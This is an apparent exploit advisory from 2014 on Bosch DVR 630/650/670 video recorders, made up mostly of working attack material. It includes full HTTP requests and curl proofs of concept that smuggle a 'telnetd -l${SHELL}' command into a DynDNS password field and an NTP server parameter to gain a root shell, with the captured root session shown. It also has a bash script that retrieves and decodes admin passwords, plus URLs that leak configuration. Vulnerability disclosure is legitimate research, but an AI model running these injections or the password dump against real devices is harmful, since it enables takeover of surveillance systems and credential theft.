@@ -1,0 +1,260 @@
+ :::::::-.   ...    ::::::.    :::.
+  ;;,   `';, ;;     ;;;`;;;;,  `;;;
+  `[[     [[[['     [[[  [[[[[. '[[
+   $$,    $$$$      $$$  $$$ "Y$c$$
+   888_,o8P'88    .d888  888    Y88
+   MMMMP"`   "YmmMMMM""  MMM     YM
+ 
+  [ Discovered by dun \ posdub[at]gmail.com ]
+  [ 2014-10-01                              ]
+###############################################################################
+# [ Bosch Security Systems DVR 630/650/670 Series ] Multiple Vulnerabilities  #
+###############################################################################
+#
+# Device: "The Bosch Video Recorder 630/650 Series is an 8/16
+#          channel digital recorder that uses the latest H.264
+#          compression technology. With the supplied PC
+#          software and built-in web server, the 630/650 Series is
+#          a fully integrated, stand-alone video management
+#          solution that's ready to go, straight out of the box.
+#          Available with a variety of storage capacities, the
+#          630/650 Series features a highly reliable embedded
+#          design that minimizes maintenance and reduces
+#          operational costs. The recorder is also available with a
+#          built-in DVD writer."
+#
+# Vendor:    http://www.boschsecurity.com/
+# Product:   DVR 630/650  http://resource.boschsecurity.us/documents/Data_sheet_enUS_1977239307.pdf
+#            DVR 670      http://resource.boschsecurity.us/documents/DVR_670_Series_Data_sheet_enUS_7654294923.pdf
+#
+# Software Download:
+# http://resource.boschsecurity.us/software/Software_DVR630_650_firmware_v212_all_1980902667.zip
+# http://resource.boschsecurity.us/software/Software_DVR670_firmware_v212_enUS_8599929867.zip
+# 
+# Timeline: 2014-10-01 Vulnerability discovered
+#           2014-10-03 1 Contact with vendor - No response
+#           2014-10-14 Published
+#
+#
+###################################################################
+# Gaining Root Shell Access [1]:
+
+POST /Net_work.xml HTTP/1.1
+Accept: */*
+Accept-Language: pl
+Referer: http://10.11.219.2/network.html
+Content-Type: text/xml; charset=UTF-8
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)
+Host: 10.11.219.2
+Content-Length: 1274
+DNT: 1
+Proxy-Connection: Keep-Alive
+Pragma: no-cache
+Cookie: MosaLanguage=0; session=
+
+<NETWORK_SETTING>
+  <DHCP>0</DHCP>
+  <DHCPIP>10.11.219.2</DHCPIP>
+  <DHCPMASK>255.255.255.0</DHCPMASK>
+  <DHCPGW>10.11.219.1</DHCPGW>
+  <DHCPDNS1>0.0.0.0</DHCPDNS1>
+  <DHCPDNS2>0.0.0.0</DHCPDNS2>
+  <IP>10.11.219.2</IP>
+  <MASK>255.255.255.0</MASK>
+  <GW>10.11.219.1</GW>
+  <DNS1>0.0.0.0</DNS1>
+  <DNS2>0.0.0.0</DNS2>
+  <HTTP_PORT>80</HTTP_PORT>
+  <BANDWIDTH>0</BANDWIDTH>
+  <DDNS_SERVER>1</DDNS_SERVER>
+  <DYNDNS_HOST>wxss</DYNDNS_HOST>
+  <DYNDNS_USER>ffl</DYNDNS_USER>
+  <DYNDNS_PWD>|telnetd -l${SHELL} -p30 #</DYNDNS_PWD>
+  <TZO_HOST></TZO_HOST>
+  <TZO_MAIL></TZO_MAIL>
+  <TZO_KEY></TZO_KEY>
+  <SITE_HOST>sdads</SITE_HOST>
+  <SITE_PWD>dsadsd</SITE_PWD>
+  <SITE_RECORDID>sdasdas</SITE_RECORDID>
+  <SITE_FQDN>dasdas</SITE_FQDN>
+  <ALARM_ON>0</ALARM_ON>
+  <MOTION>0</MOTION>
+  <DISK_FAIL>0</DISK_FAIL>
+  <DISK_FULL>0</DISK_FULL>
+  <FAN_FAIL>0</FAN_FAIL>
+  <DISK_TEMP>0</DISK_TEMP>
+  <ADMIN_PW>0</ADMIN_PW>
+  <VIDEO_LOSS>0</VIDEO_LOSS>
+  <POWER>0</POWER>
+  <SENDER>0</SENDER>
+  <SMTP></SMTP>
+  <SMTP_PORT>25</SMTP_PORT>
+  <SSL>0</SSL>
+  <USERNAME></USERNAME>
+  <PWD></PWD>
+  <SENDER_MAIL></SENDER_MAIL>
+  <SUBJECT></SUBJECT>
+  <MAIL_1></MAIL_1>
+  <MAIL_2></MAIL_2>
+  <MAIL_3></MAIL_3>
+  <MAIL_TEST>0</MAIL_TEST>
+</NETWORK_SETTING>
+
+## PoC:
+
+root@debian:~# curl -i -s -k  -X 'POST'     -H 'Referer: http://10.11.219.2/network.html' -H 'Content-Type: text/xml; charset=UTF-8'  \
+  -H 'User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)' -H 'DNT: 1'     \
+  -b 'MosaLanguage=0; session='     --data-binary $'<NETWORK_SETTING>\x0d\x0a  <DHCP>0</DHCP>\x0d\x0a  <DHCPIP>10.11.219.2</DHCPIP>\x0d\x0a  \
+  <DHCPMASK>255.255.255.0</DHCPMASK>\x0d\x0a  <DHCPGW>10.11.219.1</DHCPGW>\x0d\x0a  <DHCPDNS1>0.0.0.0</DHCPDNS1>\x0d\x0a  \
+  <DHCPDNS2>0.0.0.0</DHCPDNS2>\x0d\x0a  <IP>10.11.219.2</IP>\x0d\x0a  <MASK>255.255.255.0</MASK>\x0d\x0a  <GW>10.11.219.1</GW>\x0d\x0a  \
+  <DNS1>0.0.0.0</DNS1>\x0d\x0a  <DNS2>0.0.0.0</DNS2>\x0d\x0a  <HTTP_PORT>80</HTTP_PORT>\x0d\x0a  <BANDWIDTH>0</BANDWIDTH>\x0d\x0a  \
+  <DDNS_SERVER>1</DDNS_SERVER>\x0d\x0a  <DYNDNS_HOST>wxss</DYNDNS_HOST>\x0d\x0a  <DYNDNS_USER>ffl</DYNDNS_USER>\x0d\x0a  \
+  <DYNDNS_PWD>|telnetd -l${SHELL} -p30 #</DYNDNS_PWD>\x0d\x0a  <TZO_HOST></TZO_HOST>\x0d\x0a  <TZO_MAIL></TZO_MAIL>\x0d\x0a  \
+  <TZO_KEY></TZO_KEY>\x0d\x0a  <SITE_HOST>sdads</SITE_HOST>\x0d\x0a  <SITE_PWD>dsadsd</SITE_PWD>\x0d\x0a  \
+  <SITE_RECORDID>sdasdas</SITE_RECORDID>\x0d\x0a  <SITE_FQDN>dasdas</SITE_FQDN>\x0d\x0a  <ALARM_ON>0</ALARM_ON>\x0d\x0a  \
+  <MOTION>0</MOTION>\x0d\x0a  <DISK_FAIL>0</DISK_FAIL>\x0d\x0a  <DISK_FULL>0</DISK_FULL>\x0d\x0a  <FAN_FAIL>0</FAN_FAIL>\x0d\x0a  \
+  <DISK_TEMP>0</DISK_TEMP>\x0d\x0a  <ADMIN_PW>0</ADMIN_PW>\x0d\x0a  <VIDEO_LOSS>0</VIDEO_LOSS>\x0d\x0a  <POWER>0</POWER>\x0d\x0a  \
+  <SENDER>0</SENDER>\x0d\x0a  <SMTP></SMTP>\x0d\x0a  <SMTP_PORT>25</SMTP_PORT>\x0d\x0a  <SSL>0</SSL>\x0d\x0a  <USERNAME></USERNAME>\x0d\x0a  \
+  <PWD></PWD>\x0d\x0a  <SENDER_MAIL></SENDER_MAIL>\x0d\x0a  <SUBJECT></SUBJECT>\x0d\x0a  <MAIL_1></MAIL_1>\x0d\x0a  <MAIL_2></MAIL_2>\x0d\x0a  \
+  <MAIL_3></MAIL_3>\x0d\x0a  <MAIL_TEST>0</MAIL_TEST>\x0d\x0a</NETWORK_SETTING>\x0d\x0a'     'http://10.11.219.2/Net_work.xml'
+
+root@debian:~# telnet 10.11.219.2 30
+Trying 10.11.219.2...
+Connected to 10.11.219.2.
+Escape character is '^]'.
+
+BusyBox v1.1.2 (2009.12.29-03:59+0000) Built-in shell (ash)
+Enter 'help' for a list of built-in commands.
+
+/ # id
+uid=0(root) gid=0(root)
+/ # uname -a
+Linux everfocus 2.6.24-rt1-hi3520v100 #9 Thu Sep 2 14:00:47 CST 2010 armv6l unknown
+/ # ps |grep telnet
+ 2827 root        228 S   telnetd -l/bin/sh -p30
+/ # netstat -ltn | grep 30
+tcp        0      0 0.0.0.0:30              0.0.0.0:*               LISTEN
+/ # echo pwnd & exit
+pwnd
+Connection closed by foreign host.
+root@debian:~#
+
+###################################################################
+# Gaining Root Shell Access (authorization is needed) [2]:
+
+GET /ntp.cgi?cmd=ntp_start&time_server=1&private_server=192.168.0.245|%20telnetd%20-l${SHELL}%20-p40;%20id&rnd=4392 HTTP/1.1
+Accept: */*
+Accept-Language: pl
+Referer: http://10.11.219.2/system.html
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)
+Host: 10.11.219.2
+DNT: 1
+Proxy-Connection: Keep-Alive
+Cookie: MosaLanguage=0; session=
+
+## PoC:
+
+root@debian:~# curl -i -s -k  -X 'GET'     \
+  -H 'Referer: http://10.11.219.2/system.html' \
+  -H 'User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)' -H 'DNT: 1'     \
+  -b 'MosaLanguage=0; session='     'http://10.11.219.2/ntp.cgi?cmd=ntp_start&time_server=1&private_server=192.168.0.245|%20telnetd%20-l${SHELL}%20-p40;%20id'
+
+
+root@debian:~# telnet 10.11.219.2 40
+Trying 10.11.219.2...
+Connected to 10.11.219.2.
+Escape character is '^]'.
+
+BusyBox v1.1.2 (2009.12.29-03:59+0000) Built-in shell (ash)
+Enter 'help' for a list of built-in commands.
+
+/ # id
+uid=0(root) gid=0(root)
+/ # uname -a
+Linux everfocus 2.6.24-rt1-hi3520v100 #9 Thu Sep 2 14:00:47 CST 2010 armv6l unknown
+/ # ps |grep telnet
+ 2827 root        228 S   telnetd -l/bin/sh -p40
+/ # netstat -ltn | grep 40
+tcp        0      0 0.0.0.0:40              0.0.0.0:*               LISTEN
+/ # echo pwnd & exit
+pwnd
+Connection closed by foreign host.
+root@debian:~#
+
+###################################################################
+# Admin Password Disclosure: http://10.11.219.2/User.cgi?cmd=get_user
+
+## PoC Exploit:
+
+#!/bin/bash
+x=0;
+for i in $(curl --silent http://10.11.219.2/User.cgi?cmd=get_user| sed 's/<[^>]\+>/ /g' | sed -r 's/(\s)+[0-9]//g');
+do base64 -d<<<$i; if [ $(( $x % 2 )) -eq 0 ]; then echo -n ":"; else echo ; fi; ((x++)); done
+
+###################################################################
+# Sensitive Information Disclosure:
+
+http://10.11.219.2/Config.cgi?cmd=system_info
+http://10.11.219.2/System.xml
+http://10.11.219.2/Net_work.xml
+
+http://10.11.219.2/webcmd.html
+
+/ # cat /4mosa600/data/Webcmd_help.txt
+
+   cmd                     value (sample)
+====================+==========================
+ blockid            |       0 ~ block max     // show block info and flag and gop status.
+--------------------+-------------------------
+ disk               |                         // show disk temp.
+--------------------+-------------------------
+ reboot             |                         // restart DVR.
+--------------------+-------------------------
+ remote-info        |                         // socket status.
+--------------------+-------------------------
+ log                |      1:   System        // show system log.
+                    |      2:   Record
+                    |      4:   Login
+                    |      8:   Configure
+                    |      16:  Operation
+                    |      31:  All
+                    |      63:  Service
+--------------------+-------------------------
+ ionly              |      1~12 how many frames in a GOP will send to internet
+                    |      0:   all I/P-frame (default)
+                    |      1:   I only
+                    |      2:   IP
+                    |      3:   IPP
+                    |      4:   IPPP
+                    |      ....
+                    |      12:  IPPPPPPPPPPP
+                    |      others: show current value on DVR.
+--------------------+-------------------------
+ chlink             |      0~MKF_CHANNEL      // show channel link.
+--------------------+-------------------------
+ bitrate            |                         // show bitrate information.
+--------------------+-------------------------
+ dls                |                         // show about time and DLS message.
+--------------------+-------------------------
+ bmp                |                         // dump bmp file to http://x.x.x.x/vga0.bmp
+--------------------+-------------------------
+ msg                |      This is bitmap
+                    |      bit 0 show encode FPS and Bitrate.             
+                    |      bit 1 show encode resolution.(dependent bit 1)             
+                    |      bit 2 show remote client mesage.
+                    |      bit 3 show ptz command.
+                    |      bit 4 cpu and memory usage..
+--------------------+-------------------------
+ remote-cgi         |      0     disable all cgi command.
+                    |      1     show all cgi command to console.
+                    |      2     show cig command if not "login_id"
+--------------------+-------------------------
+
+
+
+
+
+
+
